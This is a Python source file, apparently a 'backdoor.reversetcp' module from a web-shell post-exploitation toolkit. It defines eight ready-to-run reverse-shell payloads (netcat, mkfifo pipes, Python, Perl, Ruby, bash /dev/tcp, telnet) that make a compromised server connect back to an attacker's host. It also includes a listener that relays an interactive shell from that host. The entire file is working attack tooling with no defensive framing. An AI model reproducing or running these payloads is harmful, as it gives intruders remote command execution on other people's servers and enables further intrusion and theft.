from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser
from urlparse import urlparse
from telnetlib import Telnet
from time import sleep
import socket, select, sys
        
WARN_BINDING_SOCKET = 'Binding socket'

class TcpServer:
    
    def __init__(self, port):
        self.connect = False
        self.hostname = '127.0.0.1'
        self.port = port
        
        
        socket_state = False
        
        self.connect_socket()
        self.forward_data()
        
    
    def connect_socket(self):
        if(self.connect):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect( (self.hostname, self.port) )
                
        else:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
            try:
                server.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
            except socket.error:
                #print("Warning: unable to set TCP_NODELAY...")
                pass
        
            try:    
                server.bind(('localhost', self.port))
            except socket.error, e:
                raise ProbeException('backdoor.reversetcp', '%s %s' % (WARN_BINDING_SOCKET, str(e)))
            
            server.listen(1)
            
            server.settimeout(3)

            try:
                self.socket, address = server.accept()
            except socket.timeout, e:
                server.close()
                raise ExecutionException('backdoor.reversetcp', 'timeout')

    def forward_data(self):
        self.socket.setblocking(0)
        print '[backdoor.reversetcp] Reverse shell connected, insert commands'
        
        
        while(1):
            read_ready, write_ready, in_error = select.select([self.socket, sys.stdin], [], [self.socket, sys.stdin])
            
            try:
                buffer = self.socket.recv(100)
                while( buffer  != ''):
                    
                    self.socket_state = True
                    
                    sys.stdout.write(buffer)
                    sys.stdout.flush()
                    buffer = self.socket.recv(100)
                if(buffer == ''):
                    return 
            except socket.error:
                pass
            while(1):
                r, w, e = select.select([sys.stdin],[],[],0)
                if(len(r) == 0):
                    break;
                c = sys.stdin.read(1)
                if(c == ''):
                    return 
                if(self.socket.sendall(c) != None):
                    return 
                
                
        

class Reversetcp(ModuleGuess):
    '''Send reverse TCP shell'''

    def _set_vectors(self):
        self.vectors.add_vector('netcat-traditional', 'shell.sh',  """sleep 1; nc -e $shell $host $port""")
        self.vectors.add_vector('netcat-bsd','shell.sh',  """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f""")
        self.vectors.add_vector( 'python','shell.sh', """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'""")
        self.vectors.add_vector('devtcp','shell.sh',  "sleep 1; /bin/bash -c \'$shell 0</dev/tcp/$host/$port 1>&0 2>&0\'")
        self.vectors.add_vector('perl','shell.sh',  """perl -e 'use Socket;$i="$host";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
        self.vectors.add_vector('ruby','shell.sh', """ruby -rsocket -e'f=TCPSocket.open("$host",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
        self.vectors.add_vector('telnet','shell.sh', """sleep 1;rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet $host $port 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe""")
        self.vectors.add_vector( 'python-pty','shell.sh', """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash");'""")
    
    def _set_args(self):
        self.argparser.add_argument('host', help='Host where connect to')
        self.argparser.add_argument('-port', help='Port', type=int, default=19091)
        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')



    def _execute_vector(self):
        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'], 'host' : self.args['host'] })
        if not self.args['no_connect']:
            if TcpServer(self.args['port']).socket_state:
                raise ProbeSucceed(self.name, 'Tcp connection succeed')
